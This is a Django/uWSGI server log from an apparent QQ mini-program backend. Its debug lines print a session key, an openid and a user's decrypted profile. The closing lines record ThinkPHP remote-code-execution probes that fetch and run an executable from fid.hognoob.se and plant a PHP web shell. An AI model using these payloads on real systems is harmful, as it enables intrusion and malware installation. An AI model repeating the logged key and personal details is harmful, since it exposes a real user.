/home/ubuntu/.local/lib/python3.5/site-packages/django/db/models/fields/__init__.py:1421: RuntimeWarning: DateTimeField SessionInfo.create_time received a naive datetime (2019-05-08 03:40:14.881237) while time zone support is active.
  RuntimeWarning)
/home/ubuntu/.local/lib/python3.5/site-packages/django/db/models/fields/__init__.py:1421: RuntimeWarning: DateTimeField SessionInfo.last_vist_time received a naive datetime (2019-05-08 03:40:14.881250) while time zone support is active.
  RuntimeWarning)
[pid: 7084|app: 0|req: 2/3] 59.37.125.67 () {52 vars in 822 bytes} [Wed May  8 03:40:14 2019] POST /UserLogin/login => generated 521 bytes in 407 msecs (HTTP/1.1 200) 3 headers in 101 bytes (1 switches on core 0)
<QuerySet [<UserInfo: UserInfo object (1)>]>
<QuerySet []>
[pid: 7083|app: 0|req: 1/4] 59.37.125.67 () {52 vars in 830 bytes} [Wed May  8 03:40:16 2019] POST /UserLogin/myCreation => generated 212 bytes in 107 msecs (HTTP/1.1 200) 3 headers in 101 bytes (1 switches on core 0)
b'{"encrypt_data":"mZSIRowxqcx5je7gmmhsaiRA21A3npGHDB3adRtJq+NllFN3RhPBYPTpVjnCRHU7hXwr83jVc2Csps70Xx9uEjynwuHBPdUNEY25jUFkvuQNQx7Jka1r78jTw9HX1Y99Ej9J59GrikAkFT3nNkGPynDgB2fKphQknGgX6SQjJudJWQxvH9HvhAby627Pz44LL3mFkKB2hH45MSBq2p89W8/MHiAPHqzqe0yeKQTy6kKspjWiDWrV3uJjLRN7dkChYZQla/LS2YIkObaDgtg/0gGoJs2WeGFiWi3Es1oh4Rthk6P0eeMgTweKd1pBLgsUXPXUxpUn3hXcCsKKDd3vyqpuRcaHA4iaiLAFqDs3E+vH5Uad9f9xs4UUY/MvgS8z36V0oIRJO7GmWKIigqUheEHkBIs2ew9zoemgmx2GqirTLqkbdU2OQKm06ZUYspC4","code":"3ebc488ba1774ee8740c3e884965be30","iv":"YTI5MjczNmVhMjQxNDQ5MA=="}'
<class 'bytes'>
<class 'dict'>
从接口获得的信息是
{'errcode': 0, 'unionid': '', 'errmsg': '', 'uin': '', 'openid': '9B719F03B5EA8BF3801E27A434DE7A6C', 'session_key': 'MTNuRTVrZFA0a2Y2Q1ZoaA=='}
原始获得的session_key是MTNuRTVrZFA0a2Y2Q1ZoaA==
out decrypt----------------------->
in decrypt----------------------->
开始获取用户信息
原来的session_keyMTNuRTVrZFA0a2Y2Q1ZoaA==
原来的敏感信息mZSIRowxqcx5je7gmmhsaiRA21A3npGHDB3adRtJq+NllFN3RhPBYPTpVjnCRHU7hXwr83jVc2Csps70Xx9uEjynwuHBPdUNEY25jUFkvuQNQx7Jka1r78jTw9HX1Y99Ej9J59GrikAkFT3nNkGPynDgB2fKphQknGgX6SQjJudJWQxvH9HvhAby627Pz44LL3mFkKB2hH45MSBq2p89W8/MHiAPHqzqe0yeKQTy6kKspjWiDWrV3uJjLRN7dkChYZQla/LS2YIkObaDgtg/0gGoJs2WeGFiWi3Es1oh4Rthk6P0eeMgTweKd1pBLgsUXPXUxpUn3hXcCsKKDd3vyqpuRcaHA4iaiLAFqDs3E+vH5Uad9f9xs4UUY/MvgS8z36V0oIRJO7GmWKIigqUheEHkBIs2ew9zoemgmx2GqirTLqkbdU2OQKm06ZUYspC4
原来的iv信息YTI5MjczNmVhMjQxNDQ5MA==
99999999999999999
base64加密后的敏感字段b'\x99\x94\x88F\x8c1\xa9\xccy\x8d\xee\xe0\x9ahlj$@\xdbP7\x9e\x91\x87\x0c\x1d\xdau\x1bI\xab\xe3e\x94SwF\x13\xc1`\xf4\xe9V9\xc2Du;\x85|+\xf3x\xd5s`\xac\xa6\xce\xf4_\x1fn\x12<\xa7\xc2\xe1\xc1=\xd5\r\x11\x8d\xb9\x8dAd\xbe\xe4\rC\x1e\xc9\x91\xadk\xef\xc8\xd3\xc3\xd1\xd7\xd5\x8f}\x12?I\xe7\xd1\xab\x8a@$\x15=\xe76A\x8f\xcap\xe0\x07g\xca\xa6\x14$\x9ch\x17\xe9$#&\xe7IY\x0co\x1f\xd1\xef\x84\x06\xf2\xebn\xcf\xcf\x8e\x0b/y\x85\x90\xa0v\x84~91 j\xda\x9f=[\xcf\xcc\x1e \x0f\x1e\xac\xea{L\x9e)\x04\xf2\xeaB\xac\xa65\xa2\rj\xd5\xde\xe2c-\x13{v@\xa1a\x94%k\xf2\xd2\xd9\x82$9\xb6\x83\x82\xd8?\xd2\x01\xa8&\xcd\x96xabZ-\xc4\xb3Z!\xe1\x1ba\x93\xa3\xf4y\xe3 O\x07\x8awZA.\x0b\x14\\\xf5\xd4\xc6\x95\'\xde\x15\xdc\n\xc2\x8a\r\xdd\xef\xca\xaanE\xc6\x87\x03\x88\x9a\x88\xb0\x05\xa8;7\x13\xeb\xc7\xe5F\x9d\xf5\xffq\xb3\x85\x14c\xf3/\x81/3\xdf\xa5t\xa0\x84I;\xb1\xa6X\xa2"\x82\xa5!xA\xe4\x04\x8b6{\x0fs\xa1\xe9\xa0\x9b\x1d\x86\xaa*\xd3.\xa9\x1buM\x8e@\xa9\xb4\xe9\x95\x18\xb2\x90\xb8'
base64加密后session_keyb'13nE5kdP4kf6CVhh'
8888888888888888888888888888
b'{"avatarUrl":"https://thirdqq.qlogo.cn/qqapp/1108814124/9B719F03B5EA8BF3801E27A434DE7A6C/100","city":"\xe6\x8f\xad\xe9\x98\xb3","country":"\xe4\xb8\xad\xe5\x9b\xbd","gender":1,"language":"zh_CN","nickName":"\xe8\xb5\xb0\xe8\xb5\xb0\xe5\x81\x9c\xe5\x81\x9c\xe4\xb8\xb6","openId":"9B719F03B5EA8BF3801E27A434DE7A6C","province":"\xe5\xb9\xbf\xe4\xb8\x9c","unionId":"","watermark":{"appid":"1108814124","timestamp":1557286926}}\r\r\r\r\r\r\r\r\r\r\r\r\r'
解密后的用户敏感信息{"avatarUrl":"https://thirdqq.qlogo.cn/qqapp/1108814124/9B719F03B5EA8BF3801E27A434DE7A6C/100","city":"揭阳","country":"中国","gender":1,"language":"zh_CN","nickName":"走走停停丶","openId":"9B719F03B5EA8BF3801E27A434DE7A6C","province":"广东","unionId":"","watermark":{"appid":"1108814124","timestamp":1557286926}}
222222222222
11111111111111111
{'country': '中国', 'openId': '9B719F03B5EA8BF3801E27A434DE7A6C', 'language': 'zh_CN', 'city': '揭阳', 'unionId': '', 'avatarUrl': 'https://thirdqq.qlogo.cn/qqapp/1108814124/9B719F03B5EA8BF3801E27A434DE7A6C/100', 'nickName': '走走停停丶', 'watermark': {'timestamp': 1557286926, 'appid': '1108814124'}, 'gender': 1, 'province': '广东'}
<class 'dict'>
out------->change_session
True
<QuerySet [<SessionInfo: 9B719F03B5EA8BF3801E27A434DE7A6C>]>
True
/home/ubuntu/.local/lib/python3.5/site-packages/django/db/models/fields/__init__.py:1421: RuntimeWarning: DateTimeField SessionInfo.create_time received a naive datetime (2019-05-08 03:42:07.211019) while time zone support is active.
  RuntimeWarning)
/home/ubuntu/.local/lib/python3.5/site-packages/django/db/models/fields/__init__.py:1421: RuntimeWarning: DateTimeField SessionInfo.last_vist_time received a naive datetime (2019-05-08 03:42:07.211030) while time zone support is active.
  RuntimeWarning)
[pid: 7084|app: 0|req: 3/5] 14.17.22.33 () {52 vars in 821 bytes} [Wed May  8 03:42:06 2019] POST /UserLogin/login => generated 558 bytes in 408 msecs (HTTP/1.1 200) 3 headers in 101 bytes (1 switches on core 0)
Not Found: /aiGuess/playing/d057ef27-7be7-56a0-a42f-a9527064ca73/
[pid: 7083|app: 0|req: 2/6] 14.17.22.33 () {50 vars in 871 bytes} [Wed May  8 03:42:15 2019] GET /aiGuess/playing/d057ef27-7be7-56a0-a42f-a9527064ca73/ => generated 2317 bytes in 7 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
Not Found: /aiGuess/playing/d057ef27-7be7-56a0-a42f-a9527064ca73/
[pid: 7084|app: 0|req: 4/7] 59.37.125.67 () {50 vars in 872 bytes} [Wed May  8 03:42:16 2019] GET /aiGuess/playing/d057ef27-7be7-56a0-a42f-a9527064ca73/ => generated 2317 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
Not Found: /aiGuess/playing/d057ef27-7be7-56a0-a42f-a9527064ca73/
[pid: 7082|app: 0|req: 1/8] 14.17.22.33 () {50 vars in 871 bytes} [Wed May  8 03:42:20 2019] GET /aiGuess/playing/d057ef27-7be7-56a0-a42f-a9527064ca73/ => generated 2317 bytes in 115 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
Not Found: /aiGuess/playing/d057ef27-7be7-56a0-a42f-a9527064ca73/
[pid: 7084|app: 0|req: 5/9] 14.17.22.33 () {50 vars in 872 bytes} [Wed May  8 03:42:28 2019] GET /aiGuess/playing/d057ef27-7be7-56a0-a42f-a9527064ca73/ => generated 2317 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
Not Found: /aiGuess/playing/d057ef27-7be7-56a0-a42f-a9527064ca73/
[pid: 7083|app: 0|req: 3/10] 14.17.22.33 () {50 vars in 871 bytes} [Wed May  8 03:42:34 2019] GET /aiGuess/playing/d057ef27-7be7-56a0-a42f-a9527064ca73/ => generated 2317 bytes in 6 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
Not Found: /aiGuess/playing/d057ef27-7be7-56a0-a42f-a9527064ca73/
[pid: 7075|app: 0|req: 1/11] 14.17.22.33 () {50 vars in 871 bytes} [Wed May  8 03:42:39 2019] GET /aiGuess/playing/d057ef27-7be7-56a0-a42f-a9527064ca73/ => generated 2317 bytes in 105 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
b'{"encrypt_data":"3Lx9uRP2dRhB+BY6j8NgMdqYDK2/YuezfM+hhNOz5IIEHUe3OJ6TfdVw9wC5gaBrrOdW/Wq5m2ej9aMZYi6QDiRIV+XWrm6yN3Dlns7WNQqkEuY5/SfFE0VsDAVOhWbH/Y2XhnT66Ub/wuwaV/AmYGtitmybGLNpLaZWWXRhKkJ6agfa3EskH+C3O/xYOk4AxZgyeaWeN4PQWn9rJhMlmsavgcdN4rCe4qgQKkNK0eHDo+3+vLzZNFcfjwikfqITHUNT0kzzteX0NlEqCjIMy5OtjLsaEuA2X+nQ3uAUvTjAWGepK/JzNj5CnrdMeivAxelrGlGXaMhwomrroPP4jN/kG8mpU7ylvniJ+b49gMuEtVSX/74Tr1qO7f5pDR6WsXoniHZ2MbxwN9y1VETqmZ7UHYwpsGTJoIQc0Wvsi0hUYbShVwxq5pkS30Wu+Zo4","code":"3ebc488ba1774ee8740c3e884965be30","iv":"YjMxNzhmNzBkMTc3NDBiOA=="}'
<class 'bytes'>
<class 'dict'>
从接口获得的信息是
{'errcode': 0, 'unionid': '', 'errmsg': '', 'uin': '', 'openid': '9B719F03B5EA8BF3801E27A434DE7A6C', 'session_key': 'MTNuRTVrZFA0a2Y2Q1ZoaA=='}
原始获得的session_key是MTNuRTVrZFA0a2Y2Q1ZoaA==
out decrypt----------------------->
in decrypt----------------------->
开始获取用户信息
原来的session_keyMTNuRTVrZFA0a2Y2Q1ZoaA==
原来的敏感信息3Lx9uRP2dRhB+BY6j8NgMdqYDK2/YuezfM+hhNOz5IIEHUe3OJ6TfdVw9wC5gaBrrOdW/Wq5m2ej9aMZYi6QDiRIV+XWrm6yN3Dlns7WNQqkEuY5/SfFE0VsDAVOhWbH/Y2XhnT66Ub/wuwaV/AmYGtitmybGLNpLaZWWXRhKkJ6agfa3EskH+C3O/xYOk4AxZgyeaWeN4PQWn9rJhMlmsavgcdN4rCe4qgQKkNK0eHDo+3+vLzZNFcfjwikfqITHUNT0kzzteX0NlEqCjIMy5OtjLsaEuA2X+nQ3uAUvTjAWGepK/JzNj5CnrdMeivAxelrGlGXaMhwomrroPP4jN/kG8mpU7ylvniJ+b49gMuEtVSX/74Tr1qO7f5pDR6WsXoniHZ2MbxwN9y1VETqmZ7UHYwpsGTJoIQc0Wvsi0hUYbShVwxq5pkS30Wu+Zo4
原来的iv信息YjMxNzhmNzBkMTc3NDBiOA==
99999999999999999
base64加密后的敏感字段b"\xdc\xbc}\xb9\x13\xf6u\x18A\xf8\x16:\x8f\xc3`1\xda\x98\x0c\xad\xbfb\xe7\xb3|\xcf\xa1\x84\xd3\xb3\xe4\x82\x04\x1dG\xb78\x9e\x93}\xd5p\xf7\x00\xb9\x81\xa0k\xac\xe7V\xfdj\xb9\x9bg\xa3\xf5\xa3\x19b.\x90\x0e$HW\xe5\xd6\xaen\xb27p\xe5\x9e\xce\xd65\n\xa4\x12\xe69\xfd'\xc5\x13El\x0c\x05N\x85f\xc7\xfd\x8d\x97\x86t\xfa\xe9F\xff\xc2\xec\x1aW\xf0&`kb\xb6l\x9b\x18\xb3i-\xa6VYta*Bzj\x07\xda\xdcK$\x1f\xe0\xb7;\xfcX:N\x00\xc5\x982y\xa5\x9e7\x83\xd0Z\x7fk&\x13%\x9a\xc6\xaf\x81\xc7M\xe2\xb0\x9e\xe2\xa8\x10*CJ\xd1\xe1\xc3\xa3\xed\xfe\xbc\xbc\xd94W\x1f\x8f\x08\xa4~\xa2\x13\x1dCS\xd2L\xf3\xb5\xe5\xf46Q*\n2\x0c\xcb\x93\xad\x8c\xbb\x1a\x12\xe06_\xe9\xd0\xde\xe0\x14\xbd8\xc0Xg\xa9+\xf2s6>B\x9e\xb7Lz+\xc0\xc5\xe9k\x1aQ\x97h\xc8p\xa2j\xeb\xa0\xf3\xf8\x8c\xdf\xe4\x1b\xc9\xa9S\xbc\xa5\xbex\x89\xf9\xbe=\x80\xcb\x84\xb5T\x97\xff\xbe\x13\xafZ\x8e\xed\xfei\r\x1e\x96\xb1z'\x88vv1\xbcp7\xdc\xb5TD\xea\x99\x9e\xd4\x1d\x8c)\xb0d\xc9\xa0\x84\x1c\xd1k\xec\x8bHTa\xb4\xa1W\x0cj\xe6\x99\x12\xdfE\xae\xf9\x9a8"
base64加密后session_keyb'13nE5kdP4kf6CVhh'
8888888888888888888888888888
b'{"avatarUrl":"https://thirdqq.qlogo.cn/qqapp/1108814124/9B719F03B5EA8BF3801E27A434DE7A6C/100","city":"\xe6\x8f\xad\xe9\x98\xb3","country":"\xe4\xb8\xad\xe5\x9b\xbd","gender":1,"language":"zh_CN","nickName":"\xe8\xb5\xb0\xe8\xb5\xb0\xe5\x81\x9c\xe5\x81\x9c\xe4\xb8\xb6","openId":"9B719F03B5EA8BF3801E27A434DE7A6C","province":"\xe5\xb9\xbf\xe4\xb8\x9c","unionId":"","watermark":{"appid":"1108814124","timestamp":1557286963}}\r\r\r\r\r\r\r\r\r\r\r\r\r'
解密后的用户敏感信息{"avatarUrl":"https://thirdqq.qlogo.cn/qqapp/1108814124/9B719F03B5EA8BF3801E27A434DE7A6C/100","city":"揭阳","country":"中国","gender":1,"language":"zh_CN","nickName":"走走停停丶","openId":"9B719F03B5EA8BF3801E27A434DE7A6C","province":"广东","unionId":"","watermark":{"appid":"1108814124","timestamp":1557286963}}
222222222222
11111111111111111
{'country': '中国', 'openId': '9B719F03B5EA8BF3801E27A434DE7A6C', 'language': 'zh_CN', 'city': '揭阳', 'unionId': '', 'avatarUrl': 'https://thirdqq.qlogo.cn/qqapp/1108814124/9B719F03B5EA8BF3801E27A434DE7A6C/100', 'nickName': '走走停停丶', 'watermark': {'timestamp': 1557286963, 'appid': '1108814124'}, 'gender': 1, 'province': '广东'}
<class 'dict'>
out------->change_session
True
<QuerySet [<SessionInfo: 9B719F03B5EA8BF3801E27A434DE7A6C>]>
True
/home/ubuntu/.local/lib/python3.5/site-packages/django/db/models/fields/__init__.py:1421: RuntimeWarning: DateTimeField SessionInfo.create_time received a naive datetime (2019-05-08 03:42:44.549872) while time zone support is active.
  RuntimeWarning)
/home/ubuntu/.local/lib/python3.5/site-packages/django/db/models/fields/__init__.py:1421: RuntimeWarning: DateTimeField SessionInfo.last_vist_time received a naive datetime (2019-05-08 03:42:44.549883) while time zone support is active.
  RuntimeWarning)
[pid: 7084|app: 0|req: 6/12] 14.17.22.33 () {52 vars in 821 bytes} [Wed May  8 03:42:44 2019] POST /UserLogin/login => generated 558 bytes in 516 msecs (HTTP/1.1 200) 3 headers in 101 bytes (1 switches on core 0)
d057ef27-7be7-56a0-a42f-a9527064ca73
1
[pid: 7083|app: 0|req: 4/13] 59.37.125.67 () {52 vars in 830 bytes} [Wed May  8 03:43:43 2019] POST /AiGuess/getPlayImage => generated 2275 bytes in 6 msecs (HTTP/1.1 200) 3 headers in 102 bytes (1 switches on core 0)
Not Found: /public/index.php
[pid: 7084|app: 0|req: 7/14] 113.160.19.30 () {38 vars in 1415 bytes} [Wed May  8 05:04:12 2019] GET /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/qylwvtebxvgdoyi20180.exe');start%20C:/Windows/temp/qylwvtebxvgdoyi20180.exe => generated 2533 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
Not Found: /public/index.php
[pid: 7083|app: 0|req: 5/15] 113.160.19.30 () {38 vars in 1024 bytes} [Wed May  8 05:04:12 2019] GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php => generated 2406 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
Not Found: /public/hydra.php
[pid: 7082|app: 0|req: 2/16] 113.160.19.30 () {38 vars in 1166 bytes} [Wed May  8 05:04:13 2019] GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/qylwvtebxvgdoyi20180.exe');start%20C:/Windows/temp/qylwvtebxvgdoyi20180.exe => generated 2436 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
Not Found: /cache/global/img/gs.gif
[pid: 7084|app: 0|req: 8/17] 80.82.70.187 () {32 vars in 432 bytes} [Wed May  8 05:06:16 2019] GET /cache/global/img/gs.gif => generated 2228 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
Not Found: /wp-login.php
[pid: 7084|app: 0|req: 9/18] 101.226.102.70 () {38 vars in 643 bytes} [Wed May  8 05:48:17 2019] GET /wp-login.php => generated 2190 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
